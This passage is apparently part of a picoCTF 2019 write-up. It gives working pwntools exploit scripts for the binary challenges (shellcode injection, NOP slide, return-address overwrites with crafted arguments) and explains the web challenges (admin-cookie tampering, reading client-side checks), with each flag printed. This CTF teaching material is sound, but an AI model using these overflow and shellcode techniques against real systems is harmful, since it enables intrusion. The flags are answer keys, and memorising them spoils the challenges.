hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
</code></pre>
<p>Using an <a href="https://certlogik.com/decoder/">online certificate decode</a> we get</p>
<pre><code>Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 12345 (0x3039)
    Signature Algorithm: md2WithRSAEncryption
        Issuer:
            commonName                = PicoCTF
        Validity
            Not Before: Jul  8 07:21:18 2019 GMT
            Not After : Jun 26 17:34:38 2019 GMT
        Subject:
            commonName                = PicoCTF
            countryName               = US
            stateOrProvinceName       = PicoCTF
            localityName              = PicoCTF
            organizationName          = PicoCTF
            organizationalUnitName    = PicoCTF
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (53 bit)
                Modulus: 4966306421059967 (0x11a4d45212b17f)
                Exponent: 65537 (0x10001)
    Signature Algorithm: md2WithRSAEncryption
         07:6a:5d:61:32:c1:9e:05:bd:eb:77:f3:aa:fb:bb:83:82:eb:
         9e:a2:93:af:0c:2f:3a:e2:1a:e9:74:6b:9b:82:d8:ef:fe:1a:
         c8:b2:98:7b:16:dc:4c:d8:1e:2b:92:4c:80:78:85:7b:d3:cc:
         b7:d4:72:29:94:22:eb:bb:11:5d:b2:9a:af:7c:6b:cb:b0:2c:
         a7:91:87:ec:63:bd:22:e8:8f:dd:38:0e:a5:e1:0a:bf:35:d9:
         a4:3c:3c:7b:79:da:8e:4f:fc:ca:e2:38:67:45:a7:de:6e:a2:
         6e:71:71:47:f0:09:3e:1b:a0:12:35:15:a1:29:f1:59:25:35:
         a3:e4:2a:32:4c:c2:2e:b4:b5:3d:94:38:93:5e:78:37:ac:35:
         35:06:15:e0:d3:87:a2:d6:3b:c0:7f:45:2b:b6:97:8e:03:a8:
         d4:c9:e0:8b:68:a0:c5:45:ba:ce:9b:7e:71:23:bf:6b:db:cc:
         8e:f2:78:35:50:0c:d3:45:c9:6f:90:e4:6d:6f:c2:cc:c7:0e:
         de:fa:f7:48:9e:d0:46:a9:fe:d3:db:93:cb:9f:f3:32:70:63:
         cf:bc:d5:f2:22:c4:f3:be:f6:3f:31:75:c9:1e:70:2a:a4:8e:
         43:96:ac:33:6d:11:f3:ab:5e:bf:4b:55:8b:bf:38:38:3e:c1:
         25:9a:fd:5f
</code></pre>
<p>The modulus (n) looks very small. Using <a href="https://www.alpertron.com.ar/ECM.HTM">the same factor website</a>, we get <code>67867967 × 73176001</code></p>
<p>flag: <code>picoCTF{73176001,67867967}</code></p>
<h1><a class="header" href="#binary-exploitation" id="binary-exploitation">Binary Exploitation</a></h1>
<p>We will use the excelent <a href="https://docs.pwntools.com/en/stable/"><code>pwntools</code></a>.</p>
<pre><code class="language-bash">virtualenv -p python3 venv
source venv/bin/activate
pip install pwntools
</code></pre>
<p>Then create a .env file to store your login. Eg:</p>
<pre><code class="language-text">PICOUSER=your_name_here
PICOPSWD=your_password_here
</code></pre>
<p>Then you can use python to check</p>
<pre><code class="language-text">$ source .env
$ python3
Python 3.7.6 (default, Dec 30 2019, 19:38:28)
[Clang 11.0.0 (clang-1100.0.33.16)] on darwin
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; from os import environ
&gt;&gt;&gt; environ[&quot;PICOUSER&quot;]
'yeswriteup'
&gt;&gt;&gt;
</code></pre>
<h1><a class="header" href="#binary-exploitation-1" id="binary-exploitation-1">Binary Exploitation</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts(&quot;Enter your shellcode:&quot;);
  vuln(buf);

  puts(&quot;Thanks! Executing now...&quot;);
  
  ((void (*)())buf)();


  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
  
  return 0;
}
</code></pre>
<p>This program uses c's ability to treat a data pointer as a function pointer. Therefor we can send it any shellcode we want. To do this we use <a href="https://github.com/Gallopsled/pwntools">pwntools</a></p>
<pre><code class="language-python">from os import environ
from pwn import *

EXEC='/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln'
FLAG='/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/flag.txt'

s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])
sh = s.process(EXEC)
shellcode = asm(shellcraft.i386.cat(FLAG))
sh.sendlineafter('Enter your shellcode:', shellcode)
x = sh.recvrepeat()
print(x.decode(errors='ignore').split('...')[-1][1:])
s.close()

</code></pre>
<p>Notes:
- We do this on our own machine, it's just nicer
- The username and password should be in the bash variables <code>PICOUSER</code> and <code>PICOPSWD</code> respectivly
- <code>shellcraft.i386.cat</code> constucts asembly to cat the flag. The <code>asm</code> function turns the string code to binary.
- We need to do some annoying binary conversion. </p>
<p>flag: <code>picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}</code></p>
<h1><a class="header" href="#practice-run-1" id="practice-run-1">practice-run-1</a></h1>
<p>The easy way is to conect with ssh</p>
<pre><code class="language-shell">yeswriteup@pico-2019-shell1:~$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
yeswriteup@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ls
run_this
yeswriteup@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
</code></pre>
<p>Or use pwntools</p>
<pre><code class="language-python">
from os import environ
from pwn import *

EXEC='/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this'
s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process(EXEC)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{g3t_r3adY_2_r3v3r53}</code></p>
<h1><a class="header" href="#overflow-0" id="overflow-0">overflow-0</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, &quot;%s\n&quot;, flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc &gt; 1) {
    vuln(argv[1]);
    printf(&quot;You entered: %s&quot;, argv[1]);
  }
  else
    printf(&quot;Please enter an argument next time\n&quot;);
  return 0;
}
</code></pre>
<p>Our goal is to print the flag. Therefor we should run <code>sigsegv_handler</code>. The <code>signal</code> function makes it called on <code>SIGSEGV</code> or SegFault. The <code>strcpy</code> Function doesn't check that <code>input</code> can fit into <code>vuln</code>. Therefor by having <code>argv[1]</code> be larger than the lenght of <code>buf</code> (128), we can print the flag</p>
<pre><code class="language-python">from os import environ
from pwn import *

PATH='/problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a/'
EXEC=PATH+'vuln'
s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process([EXEC, &quot;A&quot;*200], cwd=PATH)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{3asY_P3a5y0a131490}</code></p>
<h1><a class="header" href="#overflow-1" id="overflow-1">overflow-1</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &quot;asm.h&quot;

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf(&quot;Woah, were jumping to 0x%x !\n&quot;, get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts(&quot;Give me a string and lets see what happens: &quot;);
  vuln();
  return 0;
}
</code></pre>
<p>We need to override the return address of <code>vuln</code> to call <code>flag</code>. To calcuate what to put in, we will use <a href="https://formulae.brew.sh/formula/radare2">radare2</a></p>
<pre><code class="language-bash">$ r2 vuln
-- Bindiff two files with '$ radiff2 /bin/true /bin/false'
[0x080484d0]&gt; aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x080484d0]&gt; afl~flag
0x080485e6    3 121          sym.flag
[0x080484d0]&gt; pdf @ sym.vuln
/ (fcn) sym.vuln 63
|   sym.vuln ();
|           ; var char *s @ ebp-0x48
|           ; var int32_t var_4h @ ebp-0x4
|           ; CALL XREF from main (0x8048700)
</code></pre>
<p>we can see a few things from this.</p>
<ol>
<li>We need the code to go to <code>0x080485e6</code></li>
<li>The <code>buf</code> is at <code>ebp-0x48</code>.</li>
</ol>
<p>Therefor we need a pading of <code>0x48 + 4</code> (4 for the previous base pointer) before we can add <code>0x080485e6</code>.</p>
<pre><code class="language-python">from os import environ
from pwn import *

PATH='/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
EXEC='vuln'

flag_call_adr = 0x080485e6

send = (0x48+4)*b'x' + p32(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Give me a string and lets see what happens: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}</code></p>
<h1><a class="header" href="#slippery-shellcode" id="slippery-shellcode">slippery-shellcode</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts(&quot;Enter your shellcode:&quot;);
  vuln(buf);

  puts(&quot;Thanks! Executing from a random location now...&quot;);

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
  
  return 0;
}
</code></pre>
<p>If we make the first 256 instructions <a href="https://en.wikipedia.org/wiki/NOP_slide"><code>nop</code></a>, we can garentee that the shellcode will be run completely. Therefor with some minor tweeks to 
<a href="binary/4-slippery-shellcode/../0-handy-shellcode">handy-shellcode</a>, it can be done.</p>
<pre><code class="language-python">from os import environ
from pwn import *

EXEC='/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln'
FLAG='/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/flag.txt'

s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process(EXEC)

shellcode = asm(shellcraft.nop()*256+shellcraft.i386.cat(FLAG))

sh.sendlineafter('Enter your shellcode:', shellcode)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}</code></p>
<h1><a class="header" href="#overflow-2" id="overflow-2">OverFlow 2</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&quot;Please enter your string: &quot;);
  vuln();
  return 0;
}
</code></pre>
<p>Here we need to call <code>flag(0xDEADBEEF, 0xC0DED00D)</code>. To work out how to do this we again use radare2</p>
<pre><code class="language-bash">$r2 vuln
 -- Welcome back, lazy human!
[0x080484d0]&gt; aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x080484d0]&gt; afl~flag
0x080485e6    8 144          sym.flag
[0x080484d0]&gt; pdf @ sym.vuln
/ (fcn) sym.vuln 63
|   sym.vuln ();
|           ; var char *s @ ebp-0xb8
|           ; var int32_t var_4h @ ebp-0x4
|           ; CALL XREF from main (0x8048717)
|           0x08048676      55             push ebp
|           0x08048677      89e5           mov ebp, esp
|           0x08048679      53             push ebx
|           0x0804867a      81ecb4000000   sub esp, 0xb4
|           0x08048680      e89bfeffff     call sym.__x86.get_pc_thunk.bx
|           0x08048685      81c37b190000   add ebx, 0x197b
|           0x0804868b      83ec0c         sub esp, 0xc
|           0x0804868e      8d8548ffffff   lea eax, [s]
|           0x08048694      50             push eax                    ; char *s
|           0x08048695      e896fdffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0804869a      83c410         add esp, 0x10
|           0x0804869d      83ec0c         sub esp, 0xc
|           0x080486a0      8d8548ffffff   lea eax, [s]
|           0x080486a6      50             push eax                    ; const char *s
|           0x080486a7      e8b4fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080486ac      83c410         add esp, 0x10
|           0x080486af      90             nop
|           0x080486b0      8b5dfc         mov ebx, dword [var_4h]
|           0x080486b3      c9             leave
\           0x080486b4      c3             ret
[0x080484d0]&gt; pdf @ sym.flag
/ (fcn) sym.flag 144
|   sym.flag (uint32_t arg_8h, uint32_t arg_ch);
|           ; var char *format @ ebp-0x4c
|           ; var file*stream @ ebp-0xc
|           ; var int32_t var_4h @ ebp-0x4
|           ; arg uint32_t arg_8h @ ebp+0x8
|           ; arg uint32_t arg_ch @ ebp+0xc
|           0x080485e6      55             push ebp
|           0x080485e7      89e5           mov ebp, esp
|           0x080485e9      53             push ebx
|           0x080485ea      83ec54         sub esp, 0x54               ; 'T'
|           0x080485ed      e82effffff     call sym.__x86.get_pc_thunk.bx
|           0x080485f2      81c30e1a0000   add ebx, 0x1a0e
|           0x080485f8      83ec08         sub esp, 8
|           0x080485fb      8d83b0e7ffff   lea eax, [ebx - 0x1850]
|           0x08048601      50             push eax                    ; const char *mode
|           0x08048602      8d83b2e7ffff   lea eax, [ebx - 0x184e]
|           0x08048608      50             push eax                    ; const char *filename
|           0x08048609      e892feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x0804860e      83c410         add esp, 0x10
|           0x08048611      8945f4         mov dword [stream], eax
|           0x08048614      837df400       cmp dword [stream], 0
|       ,=&lt; 0x08048618      751c           jne 0x8048636
|       |   0x0804861a      83ec0c         sub esp, 0xc
|       |   0x0804861d      8d83bce7ffff   lea eax, [ebx - 0x1844]
|       |   0x08048623      50             push eax                    ; const char *s
|       |   0x08048624      e837feffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048629      83c410         add esp, 0x10
|       |   0x0804862c      83ec0c         sub esp, 0xc
|       |   0x0804862f      6a00           push 0                      ; int status
|       |   0x08048631      e83afeffff     call sym.imp.exit           ; void exit(int status)
|       |   ; CODE XREF from sym.flag (0x8048618)
|       `-&gt; 0x08048636      83ec04         sub esp, 4
|           0x08048639      ff75f4         push dword [stream]         ; FILE *stream
|           0x0804863c      6a40           push 0x40                   ; '@' ; 64 ; int size
|           0x0804863e      8d45b4         lea eax, [format]
|           0x08048641      50             push eax                    ; char *s
|           0x08048642      e8f9fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048647      83c410         add esp, 0x10
|           0x0804864a      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef ; [0x8:4]=-1 ; 3735928559
|       ,=&lt; 0x08048651      751a           jne 0x804866d
|       |   0x08048653      817d0c0dd0de.  cmp dword [arg_ch], 0xc0ded00d ; [0xc:4]=-1 ; 3235827725
|      ,==&lt; 0x0804865a      7514           jne 0x8048670
|      ||   0x0804865c      83ec0c         sub esp, 0xc
|      ||   0x0804865f      8d45b4         lea eax, [format]
|      ||   0x08048662      50             push eax                    ; const char *format
|      ||   0x08048663      e8b8fdffff     call sym.imp.printf         ; int printf(const char *format)
|      ||   0x08048668      83c410         add esp, 0x10
|     ,===&lt; 0x0804866b      eb04           jmp 0x8048671
|     |||   ; CODE XREF from sym.flag (0x8048651)
|     ||`-&gt; 0x0804866d      90             nop
|     ||,=&lt; 0x0804866e      eb01           jmp 0x8048671
|     |||   ; CODE XREF from sym.flag (0x804865a)
|     |`--&gt; 0x08048670      90             nop
|     | |   ; CODE XREFS from sym.flag (0x804866b, 0x804866e)
|     `-`-&gt; 0x08048671      8b5dfc         mov ebx, dword [var_4h]
|           0x08048674      c9             leave
\           0x08048675      c3             ret
[0x080484d0]&gt; 
</code></pre>
<p>What do we learn from this:</p>
<ul>
<li><code>flag</code> is at <code>0x080485e6</code></li>
<li><code>buf</code> is at <code>ebp-0xb8</code></li>
<li><code>0xdeadbeef</code> is <code>cmp</code>d to <code>arg_8h</code> at <code>ebp+0x8</code> (+8)</li>
<li><code>0xc0ded00d</code> is <code>cmp</code>d to <code>arg_ch</code> at <code>ebp+0xc</code> (+12)</li>
</ul>
<p>A few mods on <a href="binary/5-overflow-2/../3-overflow-1">overflow1</a> does the trick:</p>
<pre><code class="language-python">from os import environ
from pwn import *

PATH='/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4'
EXEC='vuln'

flag_call_adr = 0x080485e6
a1 = 0xDEADBEEF
a2 = 0xC0DED00D

send = (0xb8+4)*b'x' + p32(flag_call_adr) + b'x'*4 + p32(a1) + p32(a2)

s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Please enter your string: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{arg5_and_r3turn5f5d490e6}</code></p>
<h1><a class="header" href="#newoverflow-1" id="newoverflow-1">NewOverFlow-1</a></h1>
<pre><code class="language-cpp">void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){
  puts(&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;);
  vuln();
}
</code></pre>
<p>We need to call vuln again.</p>
<p>However using the same aproach as <a href="binary/6-newoverflow-1/../3-overflow-1">overflow 1</a> gives a segfault. Due to stack alginment reasons it wount. However <a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/#solution-4">people</a> <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/NewOverFlow-1.md">figured</a> out that by puting the main address before the flag adress, it somehow makes the stack align.</p>
<p>Using radare2 to get the jump points, we can adapt previous code to get this.</p>
<pre><code class="language-python">from os import environ
from pwn import *

PATH='/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7'
EXEC='vuln'

flag_call_adr = 0x00400767
main_call_adr = 0x004007e8

send = (0x40+8)*b'x' + p64(main_call_adr) + p64(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ[&quot;PICOUSER&quot;],
        password=environ[&quot;PICOPSWD&quot;])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Welcome to 64-bit. Give me a string that gets you the flag: ', send)
sh.sendline(b' ')
x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
</code></pre>
<p>flag: <code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}</code></p>
<h1><a class="header" href="#newoverflow-2" id="newoverflow-2">NewOverFlow-2</a></h1>
<p>It appears they left in the flag function that doesn't require argument manipulation.
It works, but it's a cheep shot. See <a href="binary/7-newoverflow-2/./solve_cheep.py">this</a> do it.</p>
<h1><a class="header" href="#web-exploitation" id="web-exploitation">Web Exploitation</a></h1>
<h1><a class="header" href="#insp3ct0r" id="insp3ct0r">Insp3ct0r</a></h1>
<p>Open the network inspector, we see 3 requests to <code>2019shell1.picoctf.com</code>
<img src="web/0-insp3ct0r/./network.png" alt="" /></p>
<p>An html:</p>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;My First Website :)&lt;/title&gt;
    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans|Roboto&quot; rel=&quot;stylesheet&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mycss.css&quot;&gt;
    &lt;script type=&quot;application/javascript&quot; src=&quot;myjs.js&quot;&gt;&lt;/script&gt;
  &lt;/head&gt;

  &lt;body&gt;
    &lt;div class=&quot;container&quot;&gt;
      &lt;header&gt;
	&lt;h1&gt;Inspect Me&lt;/h1&gt;
      &lt;/header&gt;

      &lt;button class=&quot;tablink&quot; onclick=&quot;openTab('tabintro', this, '#222')&quot; id=&quot;defaultOpen&quot;&gt;What&lt;/button&gt;
      &lt;button class=&quot;tablink&quot; onclick=&quot;openTab('tababout', this, '#222')&quot;&gt;How&lt;/button&gt;
      
      &lt;div id=&quot;tabintro&quot; class=&quot;tabcontent&quot;&gt;
	&lt;h3&gt;What&lt;/h3&gt;
	&lt;p&gt;I made a website&lt;/p&gt;
      &lt;/div&gt;

      &lt;div id=&quot;tababout&quot; class=&quot;tabcontent&quot;&gt;
	&lt;h3&gt;How&lt;/h3&gt;
	&lt;p&gt;I used these to make this site: &lt;br/&gt;
	  HTML &lt;br/&gt;
	  CSS &lt;br/&gt;
	  JS (JavaScript)
	&lt;/p&gt;
	&lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&gt;
      &lt;/div&gt;
      
    &lt;/div&gt;
    
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>giving us <code>picoCTF{tru3_d3</code></p>
<p>A css:</p>
<pre><code class="language-css">div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: &quot;Open Sans&quot;;
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
</code></pre>
<p>Giving us <code>t3ct1ve_0r_ju5t</code></p>
<p>And js:</p>
<pre><code class="language-js">function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName(&quot;tabcontent&quot;);
    for (i = 0; i &lt; tabcontent.length; i++) {
	tabcontent[i].style.display = &quot;none&quot;;
    }
    tablinks = document.getElementsByClassName(&quot;tablink&quot;);
    for (i = 0; i &lt; tablinks.length; i++) {
	tablinks[i].style.backgroundColor = &quot;&quot;;
    }
    document.getElementById(tabName).style.display = &quot;block&quot;;
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?2717d7be} */
</code></pre>
<p>The flag is in the comments: <code>picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2717d7be}</code></p>
<h1><a class="header" href="#dont-use-client-side" id="dont-use-client-side">dont-use-client-side</a></h1>
<p>Looking at the code with the inspector again, we see</p>
<pre><code class="language-js">function verify() {
    checkpass = document.getElementById(&quot;pass&quot;).value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'b956') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_e') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'b}') {
                  alert(&quot;Password Verified&quot;)
                  }
                }
              }

            }
          }
        }
      }
    }
    else {
      alert(&quot;Incorrect password&quot;);
    }

  }
</code></pre>
<p>Some easy but time consuming work gives <code>picoCTF{no_clients_plz_eb956b}</code></p>
<h1><a class="header" href="#logon" id="logon">logon</a></h1>
<p>Opening the link we are given a login page</p>
<p><img src="web/2-logon/./pic1.png" alt="" /></p>
<p>We can try any login</p>
<p><img src="web/2-logon/./pic2.png" alt="" /></p>
<p>This let's us log in, but gives no flag. </p>
<p><img src="web/2-logon/./pic3.png" alt="" /></p>
<p>Looking at cookies, we aren't admin. Let's fix that</p>
<p><img src="web/2-logon/./pic4.png" alt="" /></p>
<p>Once we change the cookie to true, we can just refresh the page</p>
<p><img src="web/2-logon/./pic5.png" alt="" /></p>
<p>Flag: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6679fcb5}</code></p>
<h1><a class="header" href="#where-are-the-robots" id="where-are-the-robots">where are the robots</a></h1>
<p><a href="https://support.google.com/webmasters/answer/6062608?hl=en"><code>robots.txt</code></a> 
are uses to tell web scrapers which pages they can and cant access.</p>
<p>Going to <a href="https://2019shell1.picoctf.com/problem/12267/robots.txt"><code>https://2019shell1.picoctf.com/problem/12267/robots.txt</code></a> gives</p>
<pre><code class="language-text">User-agent: *
Disallow: /713d3.html
</code></pre>
<p>From here it's clear we should visit <a href="https://2019shell1.picoctf.com/problem/12267/713d3.html"><code>713d3.html</code></a>, which has the flag</p>
<p>Flag: <code>picoCTF{ca1cu1at1ng_Mach1n3s_713d3}</code></p>
<h1><a class="header" href="#client-side-again" id="client-side-again">Client-side-again</a></h1>
<p>Downloading the html we get </p>
<pre><code class="language-html">&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Secure Login Portal V2.0&lt;/title&gt;
&lt;/head&gt;
&lt;body background=&quot;barbed_wire.jpeg&quot; &gt;
&lt;!-- standard MD5 implementation --&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;md5.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
